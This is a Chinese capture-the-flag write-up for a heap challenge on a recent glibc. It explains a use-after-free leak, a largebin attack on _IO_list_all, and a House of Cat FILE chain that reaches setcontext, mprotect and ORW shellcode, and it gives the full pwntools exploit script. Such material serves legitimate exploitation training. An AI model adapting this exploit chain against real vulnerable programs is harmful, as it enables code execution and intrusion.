# Without hook

## 题目简述

题目提供增、删、改、查 note 的堆菜单，并故意保留释放后访问。所给高版本 glibc 已移除可直接利用的 `__malloc_hook`、`__free_hook`，需要先用 UAF 泄露 libc 与堆地址，再通过 largebin attack 覆写 `_IO_list_all`，伪造 FILE 结构并在 `exit` 时用 House of Cat、`setcontext` 和 ORW shellcode 读取 `/flag`。

## 解题过程

### 利用 UAF 完成两次泄漏

申请两个大块，并用保护块隔开，避免相邻合并：

```python
add_note(0, 0x528)
add_note(1, 0x600)
add_note(2, 0x518)
add_note(3, 0x600)
```

删除 `note[0]` 后仍可 `show`。其 `fd/bk` 已被 unsorted bin 写成 main arena 附近地址，按题目 libc 的固定偏移 `0x1f6cc0` 得到基址。随后把这个块送入 largebin，再通过 UAF 改写并读取其残留指针，减去 `0x290` 得到堆基址。

这两个偏移都来自题目附带 libc 与本地调试，换版本必须重新确认。

### largebin attack 覆写 `_IO_list_all`

large chunk 进入 largebin 后，其 `fd_nextsize`、`bk_nextsize` 会参与插入操作。UAF 允许改写已释放块的链表字段，将 nextsize 指针布置到 `_IO_list_all - 0x20`，再释放、插入另一块，触发 glibc 的链表写操作，把可控堆地址写入 `_IO_list_all`。

### FILE、`setcontext` 与 ORW

伪 FILE 使用合法的 `_IO_wfile_jumps + 0x30` 进入宽字符虚表路径。伪宽字符虚表的函数槽放置 `setcontext + 61`，使寄存器和栈指针从可控内存恢复到 ROP 链。ROP 先把堆页改成 `RWX`，再跳到 ORW shellcode；这样不依赖已经移除的 hook，也不需要执行 `execve`。

完整利用如下：

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

elf = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

if args.REMOTE:
    host = args.HOST or "challenge.example"
    port = int(args.PORT or 31337)
    io = remote(host, port)
else:
    io = process(elf.path)


def add_note(index, size):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())


def delete_note(index):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Index: ", str(index).encode())


def edit_note(index, content):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendafter(b"Content: ", content)


def show_note(index):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b"Index: ", str(index).encode())


add_note(0, 0x528)
add_note(1, 0x600)
add_note(2, 0x518)
add_note(3, 0x600)

delete_note(0)
show_note(0)
libc.address = u64(io.recv(6).ljust(8, b"\x00")) - 0x1F6CC0
log.success(f"libc = {libc.address:#x}")

# 使 note[0] 从 unsorted bin 进入 largebin。
add_note(15, 0x900)

io_list_all = libc.sym["_IO_list_all"]
io_wfile_jumps = libc.sym["_IO_wfile_jumps"]
setcontext = libc.sym["setcontext"] + 61
mprotect = libc.sym["mprotect"]

ret = libc.address + 0x22D19
pop_rdi = libc.address + 0x23BA5
pop_rsi = libc.address + 0x251FE
pop_rdx_rbx = libc.address + 0x8BBB9

edit_note(0, b"A" * 0x10)
show_note(0)
io.recvuntil(b"A" * 0x10)
heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x290
log.success(f"heap = {heap_base:#x}")

fake_file = heap_base + 0xDD0
wide_data = fake_file + 0x100
wide_vtable = fake_file + 0x200
rop_chain = fake_file + 0x300

# 改写 largebin 的 nextsize 链，目标为 _IO_list_all。
payload = p64(libc.address + 0x1F70F0) * 2
payload += p64(io_list_all - 0x20) * 2
edit_note(0, payload)

delete_note(2)
add_note(14, 0x900)

shellcode = asm(shellcraft.open("/flag"))
shellcode += asm(shellcraft.read(3, heap_base, 0x50))
shellcode += asm(shellcraft.write(1, heap_base, 0x50))

payload = p64(0) * 3
payload += p64(1)
payload += p64(0) * 14
payload += p64(wide_data)
payload += p64(0) * 6
payload += p64(io_wfile_jumps + 0x30)

payload = payload.ljust(0x100, b"\x00")
payload += p64(0) * 2
payload += p64(rop_chain - 0x90)
payload += p64(0) * 23
payload += p64(wide_vtable)

payload = payload.ljust(0x200, b"\x00")
payload += p64(0)
payload += p64(setcontext)

payload = payload.ljust(0x300, b"\x00")
payload += p64(rop_chain + 0x18)
payload += p64(ret)
payload += p64(pop_rdi) + p64(heap_base)
payload += p64(pop_rsi) + p64(0x21000)
payload += p64(pop_rdx_rbx) + p64(7) + p64(0)
payload += p64(mprotect)
payload += p64(fake_file + 0x390)

payload = payload.ljust(0x400, b"\x90")
payload += shellcode
edit_note(2, payload)

# 菜单 5 调用 exit，触发 FILE 链刷新。
io.sendlineafter(b">", b"5")
io.interactive()
```

执行到最后会输出 `/flag` 内容。官方文档没有保存动态实例的固定 flag，故这里只保留可复现的读取链，不臆造结果。

## 方法总结

glibc 移除 malloc/free hook 后，利用目标通常转向全局 FILE 状态、退出处理链或其他可调用对象。本题的顺序必须保持为：UAF 泄漏、largebin 任意地址写、合法 FILE vtable 绕过、`setcontext` 迁移到 ROP、`mprotect` 后执行 ORW。调试时应分别在 largebin 插入点和 `_IO_flush_all_lockp` 下断点，逐项核对链表字段与 FILE 偏移。
